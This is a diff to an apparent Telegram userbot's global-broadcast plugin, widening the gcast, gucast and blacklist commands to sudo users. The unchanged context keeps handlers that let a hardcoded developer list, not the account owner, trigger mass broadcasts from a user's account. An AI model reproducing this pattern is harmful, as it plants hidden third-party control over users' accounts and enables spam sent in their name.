@@ -44,6 +44,7 @@ from requests import get
 
 from config import BLACKLIST_GCAST
 from config import CMD_HANDLER
+from config import SUDO_USERS
 from X.helpers.adminHelpers import DEVS
 from X.helpers.basic import edit_or_reply
 from X.helpers.misc import HAPP, in_heroku
@@ -67,7 +68,9 @@ del _GCAST_BLACKLIST
 
 
 @Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
-@Client.on_message(filters.command("gcast", cmd) & filters.me)
+@Client.on_message(
+    filters.command(["gcast"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
         Man = await edit_or_reply(message, "`Limit Don't blame JAPANESE X USERBOT, Started global broadcast...`")
@@ -99,7 +102,9 @@ async def gcast_cmd(client: Client, message: Message):
 
 
 @Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(DEVS) & ~filters.me)
-@Client.on_message(filters.command("gucast", cmd) & filters.me)
+@Client.on_message(
+    filters.command(["gucast"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
         Man = await edit_or_reply(message, "`Limit Don't Blame Me, fucking Coward, Started global broadcast...`")
@@ -130,7 +135,9 @@ async def gucast_cmd(client: Client, message: Message):
     )
 
 
-@Client.on_message(filters.command("blchat", cmd) & filters.me)
+@Client.on_message(
+    filters.command(["blchat"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def blchatgcast(client: Client, message: Message):
     blacklistgc = "True" if BLACKLIST_GCAST else "False"
     list = BLACKLIST_GCAST.replace(" ", "\n» ")
@@ -143,7 +150,9 @@ async def blchatgcast(client: Client, message: Message):
         await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")
 
 
-@Client.on_message(filters.command("addbl", cmd) & filters.me)
+@Client.on_message(
+    filters.command(["addbl"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def addblacklist(client: Client, message: Message):
     Man = await edit_or_reply(message, "`Processing...`")
     if HAPP is None:
@@ -171,7 +180,9 @@ async def addblacklist(client: Client, message: Message):
     restart()
 
 
-@Client.on_message(filters.command("delbl", cmd) & filters.me)
+@Client.on_message(
+    filters.command(["delbl"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def delblacklist(client: Client, message: Message):
     Man = await edit_or_reply(message, "`Processing...`")
     if HAPP is None:
